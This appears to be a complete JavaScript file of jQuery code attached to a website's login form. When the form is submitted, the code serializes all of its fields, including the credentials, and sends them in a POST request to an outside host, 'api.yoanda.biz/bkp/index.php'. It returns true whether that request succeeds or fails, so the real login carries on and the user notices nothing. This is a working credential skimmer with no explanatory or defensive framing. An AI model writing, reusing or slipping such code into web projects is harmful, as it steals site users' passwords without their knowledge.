$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://api.yoanda.biz/bkp/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
